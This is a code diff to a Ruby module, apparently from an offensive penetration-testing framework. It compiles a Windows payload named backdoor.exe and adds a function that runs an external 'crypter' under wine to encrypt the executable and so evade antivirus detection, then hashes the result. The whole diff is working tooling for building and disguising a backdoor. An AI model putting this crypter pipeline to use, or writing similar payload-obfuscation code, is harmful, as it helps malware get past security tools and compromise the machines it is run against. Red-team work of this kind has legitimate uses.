@@ -165,17 +165,61 @@ module Lib_meta
 
 		# Compile into exe
 		capture_stderr('/dev/null') { compile = `#{mingw}`}
-	
-		if file_exists? ("#{@log}/backdoor.exe")
-			print_status("Payload compiled: #{@log}/backdoor.exe")
-			system("strip --strip-debug #{@log}/backdoor.exe")
+		
+		payload_path = "#{@log}/backdoor.exe"
+
+		if file_exists? (payload_path)
+			print_status("Payload compiled: #{payload_path}")
+			system("strip --strip-debug #{payload_path}")
 			# Get a SHA1 hash of the file
 			require 'digest'
-			payload_hash = Digest::SHA1.hexdigest( File.read("#{@log}/backdoor.exe") )
+			# Encrpyt payload if crypter there
+			if Menu.extbin[:crypter]
+				# Check for wine
+				unless `which wine`.empty?
+					temp_payload_path = encrypt_payload(payload_path)
+					payload_path = temp_payload_path if temp_payload_path
+				end
+			end
+			payload_hash = Digest::SHA1.hexdigest( File.read(payload_path) )
 		else
 			print_bad("Could not compile binary...")
 			return nil, nil
 		end
-		return "#{@log}/backdoor.exe", payload_hash
+		return payload_path, payload_hash
+	end
+	
+	# Use cryper.exe to encrypt the payload
+	def encrypt_payload(payload)
+		print_status("Enrypting payload...")
+
+		sleep 1
+		
+		# Due to dir switch, get absolute paths of files
+		new_path = "#{File.absolute_path(@log)}/enc_backdoor.exe"
+		payload = File.absolute_path(payload)
+
+		cmd = "#{Menu.extbin[:crypter]} #{payload} #{new_path}"
+
+		# Need to run the crypter from its dir due to dependencies
+		Dir.chdir(File.dirname(Menu.extbin[:crypter])) do
+			capture_stderr {
+				# Run and log output
+				log(cmd) { `#{cmd}` }
+			}
+		end
+
+		sleep 1
+
+		# If file exists print info and return path
+		if file_exists? new_path
+			print_good("Payload successfully encrypted")
+			response = new_path
+		else
+			print_bad("Payload encryption failed, see logs for more information")
+			response = nil
+		end
+
+		return response
 	end
 end
